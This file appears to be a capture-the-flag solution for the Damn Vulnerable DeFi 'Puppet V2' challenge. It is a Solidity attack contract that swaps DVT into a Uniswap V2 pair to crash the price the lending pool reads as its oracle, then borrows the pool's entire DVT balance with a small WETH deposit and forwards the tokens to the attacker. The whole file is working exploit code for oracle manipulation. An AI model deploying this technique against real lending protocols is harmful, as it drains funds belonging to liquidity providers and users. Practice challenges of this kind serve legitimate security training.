// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {PuppetV2Pool} from "../puppet-v2/PuppetV2Pool.sol";
import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

import "hardhat/console.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PuppetPoolV2Attack {
    PuppetV2Pool private immutable victimePool;
    IUniswapV2Pair private immutable uniswapExchange;
    IERC20 private immutable weth;
    IERC20 private immutable token;

    constructor(address _victimePool, address _uniswapExchange, address _weth, address _token) public {
        victimePool = PuppetV2Pool(_victimePool);
        uniswapExchange = IUniswapV2Pair(_uniswapExchange);
        weth = IERC20(_weth);
        token = IERC20(_token);
    }

    function launchAttack(uint256 tokenAmountIn) external payable {
        address player = msg.sender;

        // COnvert Player's ETH to WETH
        IWETH(address(weth)).deposit{value: msg.value}();

        // Swap Player's DVT tokens to WETH through UniswapV2Pair (victime's price oracle)
        token.transferFrom(player, address(uniswapExchange), tokenAmountIn);
        uniswapExchange.swap(0, weth.balanceOf(address(uniswapExchange)) - 1e17, address(this), "");

        // We crashed the DVT value relative to WETH so we can deposit a small amount of WETH to borrow big amounts of DVT.
        uint256 victimeDvtBalance = token.balanceOf(address(victimePool));
        weth.approve(address(victimePool), weth.balanceOf(address(this)));
        victimePool.borrow(victimeDvtBalance);

        // Send DVT to player
        token.transfer(player, token.balanceOf(address(this)));
    }
}
